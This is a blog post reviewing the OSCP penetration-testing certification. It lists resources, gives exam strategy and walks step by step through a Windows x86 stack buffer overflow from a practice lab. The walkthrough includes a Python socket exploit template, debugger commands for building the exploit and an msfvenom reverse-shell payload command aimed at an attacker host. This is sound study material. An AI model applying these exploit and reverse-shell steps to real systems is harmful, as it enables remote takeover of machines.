---
layout: post
title: "OSCP Certification - Resources, Buffer Overflow Practice & Review"
image: ""
date: 2020-10-28 00:01:39
tags:
  - oscp
  - offensive security
  - reviews
  - resources

description: ""
categories:
  - Reviews
---

<!-- add the button style & script -->
<link rel="stylesheet" href="/assets/css/applause-button.css"/>
<script src="/assets/js/applause-button.js"></script>

<style>

	#myBtn {
  		display: none;
  		position: fixed;
  		bottom: 40px;
  		right: 50px;
  		z-index: 99;
  		font-size: 12px;
  		border: 1px solid black;
  		outline: black;
  		background-color: #262626;
  		color: white;
  		cursor: pointer;
  		padding: 10px 22px 10px 22px;
  		border-radius: 10px;
  		font-family: 'Open Sans';
}

	#myBtn:hover {
  		background-color: #5d4d7a;
}
	applause-button {
		margin: auto;
	}
	.header-site .site-title {
      	padding-top: 5px;
      	color: white;
      	text-align: center;
      	font-weight: bold;
      	padding-left: 19px;
	}
	
	.help-img {
		max-width: 75%;
	}

	.post-content img { 
		margin: 1.875rem auto;
		display: block;
	}
</style>

<button onclick="topFunction()" id="myBtn" title="Go to top">↑</button>

<script>
// When the user scrolls down 20px from the top of the document, show the button
window.onscroll = function() {scrollFunction()};

function scrollFunction() {
  if (document.body.scrollTop > 20 || document.documentElement.scrollTop > 20) {
    document.getElementById("myBtn").style.display = "block";
  } else {
    document.getElementById("myBtn").style.display = "none";
  }
}

// When the user clicks on the button, scroll to the top of the document
function topFunction() {
  document.body.scrollTop = 0;
  document.documentElement.scrollTop = 0;
}
</script>

<img src="/assets/img/reviews/OSCP/OSCP-BADGE.png" class="oscp-badge" alt="OSCP Badge">

<p><br></p>

## Overview

This is an informal technical review of the Offensive Security Certified Professional (OSCP) certification. Tools and blogs used while practicing for my exam(s) are included here for anyone to use. This will also include technical information regarding how to pass the exam buffer overflow, as well as common pentesting strategies and techniques you should also learn to prepare. I've decided to write this review in order to help others succeed in their OSCP journeys while also providing valuable feedback and test-taking tips that will hopefully help people succeed on their exam attempts! And for those who are curious, I successfully passed my OSCP exam after two attempts. I failed my first attempt with a total of 65 points, and passed my second attempt with a total of 95 points.

<p><br></p>

## Helpful Blogs, Tools & Scripts

Here is a list of every helpful blog post, tool and script I utilized when preparing for and taking my OSCP exam.

<p><br></p>
<a href="https://github.com/21y4d/nmapAutomator">nmapAutomator</a> - Automates nmap scans to run in the background with different degrees of depth when scanning.
<br>
<a href="https://gtfobins.github.io/">GTFOBins</a> - Great for finding quick and easy privilege escalation vulnerabilities in default Linux binaries and some other installed applications.
<br>
<a href="https://guif.re/windowseop">Windows EOP Cheat Sheet</a> - Contains everything you'll need for Windows privilege escalation techniques.
<br>
<a href="https://github.com/Tib3rius/Pentest-Cheatsheets/blob/master/privilege-escalation/windows/windows-examples.rst">More Windows EOP Stuff</a>
<br>
<a href="https://noobsec.net/privesc-windows/">And MORE Windows EOP Stuff</a>
<br>
<a href="https://cas.vancooten.com/posts/2020/05/oscp-cheat-sheet-and-command-reference/#sql-injection">OSCP Cheat Sheet & Command Reference Guide</a> - Contains all the basic commands and techniques associated with the OSCP exam.
<br>
<a href="https://noobsec.net/oscp-cheatsheet/">OSCP Cheat Sheet #2 (NoobSec)</a> - Another great OSCP cheat sheet with similar commands and techniques as the previously mentioned link.
<br>
<a href="https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/">RopNop's Guide to Upgrading Shells</a> - Everything you'll need to break out of a restricted shell or upgrade your TTY.
<br>
<a href="https://ippsec.rocks/?#">Ippsec's Blog</a> - Contains all Hack The Box and related videos uploaded by the popular security Youtuber "Ippsec".
<br>
<a href="https://perspectiverisk.com/mssql-practical-injection-cheat-sheet/">MSSQL SQLi Cheat Sheet</a> - An abundance of SQLi payloads.
<br>
<a href="https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/jaws">JAWS.ps1</a> - Powershell script for enumerating common Windows privilege escalation vectors.
<br>
<a href="winPEAS - https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS">winPEAS</a> - Windows Privilege Escalation Awesome Suite. Works similarly to JAWS.
<br>
<a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS">linPEAS</a> - Linux Privilege Escalation Awesome Suite.
<br>
<a href="https://tryhackme.com/room/bufferoverflowprep">TryHackMe Buffer Overflow Preparation</a> - Requires an account on the TryHackMe website, but provides a great (and accurate) buffer overflow resource for what to expect on the OSCP exam.
<br>
<a href="https://github.com/0x4D31/awesome-oscp">Awesome-OSCP</a> - A curated list of "awesome OSCP resources". Includes guides, cheat sheets, and additional scripts.
<br>
<a href="https://github.com/chrispetrou/shellback">Shellback</a> - Standalone python script for generating reverse shells on the fly.
<p><br></p>
More information regarding buffer overflow practice (as well as my personal notes) are included below as well.
<p><br></p>
### Key Technical Skills to Pass
Cutting straight to the chase, there are only five key technical skills you're really going to need to pass the OSCP exam. While it is recommended you focus heavily on these skills for the exam, it is absolutely still recommended that you practice machines in the PWK labs as well as other platforms in order to hone a wide variety of penetration testing techniques. That being side, the following five skills will likely be the most useful for passing the exam:
<p><br></p>
```bash
1) Windows x86 Buffer Overflows 
2) Common Web Enumeration (gobuster, Nikto, Burp Suite knowledge, etc.)
3) Privilege Escalation (setuid Binaries, Unquoted Service Paths, Kernel Exploits, etc.)
4) Searchsploit/Metasploit Usage
5) Payload Generation (msfvenom)
```	
<p><br></p>

## Exam Review & Attack Strategy
The exam itself can be intimidating at the start. Your heart may be racing with anticipation to begin hitting the exam labs, only to find yourself potentially having an imposter syndrome crisis 10 hours later while feeling burnt out. However, having a proper attack strategy is truly the best way to approach the exam.
<p><br></p>
On my passing attempt, I attacked the machines in this order (granted, I received one machine from my first exam so I was able to get user on it immediately):
<p><br></p>

```bash
1) 25 Point Machine (Buffer Overflow)
2) 20 Point Machine
3) 25 Point Machine
4) 20 Point Machine
5) 10 Point Machine
```

While I was performing the buffer overflow, I ran `nmapAutomator` in the background against all of the machines on timed intervals. I ran the first two scans against a 20 point machine and the 25 point machine at the start of the buffer overflow. Towards the end (around the time I was testing my final exploit), I ran the final two `nmapAutomator` scans on the remaining hosts. This left me with two detailed scans to review after completing my buffer overflow machine. With them, I was able to quickly navigate my attack vectors for these machines instead of waiting for their port scans to finish.

The following is how I personally approached the buffer overflow machine on my second exam attempt. However, the rest of this post will delve deeper into my experience with the exam and my afterthoughts.
<p><br></p>

### Windows x86 Buffer Overflow Practice
Alright, so buffer overflows can be totally intimidating. However, based on the TryHackMe - Buffer Overflow Prep room provided above, I've created a collection of notes that helped me pass my exam buffer overflow with ease.

<p><br></p>

Note: Fuzzing is not required for the OSCP exam, so it is not covered in this post. However, the aforementioned TryHackMe room contains a great script for fuzzing a remote application.

<p><br></p>

### Crash Replication 
When performing crash replication, we first can run our existing proof of concept exploit against the vulnerable application. Upon verifying the application crashes as expected, we create a pattern of characters with the `pattern_create.rb` script from the Metasploit framework. Our pattern must be the same length as the payload that was used to cause the crash. This pattern will replace `<pattern_create>` in the code below. The `<buffer_string>` will also be replaced by the string belonging to the field we entered data into (i.e. `OVERFLOW1: <data_here>`, where `OVERFLOW1 = <buffer_string>`).
<p><br></p>

Pattern create:
```bash
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l <crash_length>
```
<p><br></p>

Script to crash application:
```python
import socket, time, sys 
 
ip = "MACHINE_IP" 

port = 1337 
prefix = "<buffer_string>" 
offset = 0 
overflow = "A" * offset 
retn = "" 
padding = "" 
payload = "<pattern_create>" 
postfix = "" 

buffer = prefix + overflow + retn + padding + payload + postfix 
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 

try: 
    s.connect((ip, port)) 
	print("Sending evil buffer...") 
	s.send(buffer + "\r\n") 
    print("Done!") 
except: 
    print("Could not connect.")
 ```
Upon crashing the application, we can run following `!mona` command in Immunity Debugger to determine the EIP offset.
<p><br></p>
```bash
!mona findmsp -distance <crash_length>
```

<p><br></p>
We can then grab the EIP offset from the following line in Immunity:
```bash
EIP Contains normal pattern : <offset_length>
```
<p><br></p>

### Controlling EIP

Once the EIP offset has been determined, we can replace the `offset` value in our script. In order to control EIP, the return (`retn`) and `payload` values will be adjusted accordingly. If everything works as planned, we should expect EIP to be overwritten by B's (`\x42`) and have the ESP register pointing to the start of our C's (`\x43`).
<p><br></p>

```python
prefix = "<buffer_string>" 
offset = <offset_length> 
overflow = "A" * offset 
retn = "BBBB" 
padding = "" 
payload = "C" * (<crash_length> - <offset_length> - 4) 
postfix = "" 
buffer = prefix + overflow + retn + padding + payload + postfix
```

Assuming everything is overwritten properly, we can begin testing for bad characters.
<p><br></p>
### Finding Bad Characters

The following script was utilized from the TryHackMe - Buffer Overflow Prep room in order to test for bad characters. The script generates a full list of bad characters while excluding the null (`\x00`) value, since it is assumed to be disregarded by default.
<p><br></p>

```python
#!/usr/bin/env python 
from __future__ import print_function 
for x in range(1, 256): 
	print("\\x" + "{:02x}".format(x), end="") 
print() 
```
The following values in our proof of concept script should additionally be adjusted to reflect the newly generated bad characters:
<p><br></p>

```python
badchars = "\x01\x02\x03\x04\x05...\xfb\xfc\xfd\xfe\xff" 

payload = badchars + "C" * (<crash_length> - <offset_length> - 4 - 255) 
```
Once the application has been crashed again, the following `!mona` commands can be ran to generate the same byte array that was previously generated in order to cross-compare bad characters in the aplication with the previously generated array.
<p><br></p>

Set `!mona` configuration to use current working directory (this will be set to the name of the application, so if the application is `oscp_server.exe` the folder path will be `c:\mona\oscp_server.exe\<restofpath>`):
```bash
!mona config -set workingfolder c:\mona\%p
```

Generate byte array in `!mona`:
```bash
!mona bytearray -b "\x00"
```

Compare byte array with `!mona` (`ESP_address` is the ESP address grabbed from Immunity):
```bash
!mona compare -f C:\mona\<app_name>\bytearray.bin -a <ESP_address>
```

At this point, we can analyze the bad characters that are listed and add them to the following script.

```python
#!/usr/bin/env python 
from __future__ import print_function 
listRem = "\\x07\\x08\\x2e\\..\\..\\etc"  # do not include the null byte here. these are example bad chars. remove and replace them with yours. 
for x in range(1, 256): 
	if "{:02x}".format(x) not in listRem: 
		print("\\x" + "{:02x}".format(x), end='') 
print()
```
From here, we can generate a new byte array with our now modified script. We will continue to update the byte array as needed until "unmodified" is shown in Immunity for the bad characters. With that said, we can repeat the same process with replacing the bad characters in our script as well as generating a new byte array with `!mona` and comparing.
<p><br></p>

1) Update proof of concept with new bad characters.
<br>
2) Crash program and update byte array with `!mona`:
```bash
!mona bytearray -b "\x00\<bad_chars>..\..\x\x"
```
3) Perform the byte array comparison again:
```bash
!mona compare -f C:\mona\<appname>\bytearray.bin -a <ESP_address>
```
4) Verify "Unmodified" is displayed. If so, move on to getting jmp esp!
<br>
5) If not, repeat steps until complete, insane, or completely insane.
<p><br></p>
### Getting jmp esp
With bad characters identified, we can run the following `!mona` command(s) to determine an appropriate jmp esp address for our exploit:

```bash
!mona jmp -r esp -cpb "\x00\<bad_chars>..\..\etc"
```

Or:

```bash
!mona find -s 'jmp esp' -type instr -cm aslr=false,rebase=false,nx=false -cpb "\x00\<bad_chars>..\..\etc"
```
Upon determining the address, we must convert it to Little Endian format by writing it in reverse (i.e. 0x62011af becomes \xaf\x11\x50\x62). We can then update the return (`retn`) value in our proof of concept to reflect the newly discovered address.

```python
retn = "<address_from_jmpesp_command>"
``` 

### Generating Shellcode 
The following `msfvenom` command is exactly what I used when generating all of my shellcode for testing Windows x86 buffer overflows:

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -b '\x00\<bad_chars>..\..\etc' EXITFUN=thread -f python -v payload -a x86
```
<p><br></p>
### Final Exploit 
Here's how everything should look once we're finished (NOPs were added for shellcode space):
```python
ip = "<IP>" 
port = <PORT> 
prefix = "<buffer_string>" 
offset = <offset_length> 
overflow = "A" * offset 
retn = "return_address" 
padding = "\x90" * 16 # added NOPs to create space for payload. This might differ for each one, so try anything from * 7 all the way to * 25 :)
payload = b"" 
payload += b"\xd9\xcd\xd9\x74\x24\xf4\x5d\x29\xc9\xb1\x52\..." 
payload += ...
...
...
postfix = "" 

buffer = prefix + overflow + retn + padding + payload + postfix 
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 

try: 
    s.connect((ip, port)) 
	print("Sending evil buffer...") 
	s.send(buffer + "\r\n") 
    print("Done!") 
except: 
    print("Could not connect.")
```

### How to Enumerate Properly for the Exam
When performing enumeration on the OSCP exam, remember to remain focused on the objective. 24 hours is more than enough time to pass the exam, so take your time and enumerate everything properly. If you think you're tracking on something, keep at it... And don't forget to use both Google and `searchsploit` to search for exploits. In my opinion, it's always better to check if something exists, even without the version number. That way you can at least determine if what you're searching for already has potential known vectors for exploitation. For example, if you encounter a website with a tag at the bottom that identifies its technology (ex: "High Security CMS"), try looking it up to see if any exploits are already known. It will help alleviate some stress if you can determine your attack vectors as early as possible.
<p><br></p>
### General Review & Afterthoughts
Overall, I had a pleasant experience with the OSCP certification exam. The PWK labs are engaging enough, and provide good baseline knowledge for what to expect on the exam. However, I would recommend practicing on sites such as HackTheBox and TryHackMe as well in order to better prepare yourself for any trickery the exam might throw at you. A final tip would be to try setting up your own "exam attempt" simulation by doing the following HackTheBox/TryHackMe machines in order:

```bash
[25pt] Buffer Overflow - TryHackMe: Buffer Overflow Prep Lab
[10pt] Easy - HackTheBox: Bastard
[20pt] Medium - HackTheBox: Haircut
[20pt] Medium - HackTheBox: Chatterbox
[25pt] Hard - HackTheBox: Bounty
```

Keep in mind the "Easy-Hard" ratings are subjective to the OSCP exam difficulty, and not necessarily overall machine difficulty. If you have any additional questions about exam preparation, hacking, or just want to chat, feel free to message me on Discord (`farbs#6657`).

<div align="center">
	<h3> Thanks for reading! </h3>
</div>
<div align="center">
<!-- add the button! -->
<applause-button style="width: 58px; height: 58px;" color="#5d4d7a" url="https://defarbs.com/"/>
</div>
<div align="center">
	<a href="https://www.hackthebox.eu/profile/39047">
		<img htb-logo="image" src="https://www.hackthebox.eu/badge/image/39047" alt="Hack The Box">
	</a>
</div>
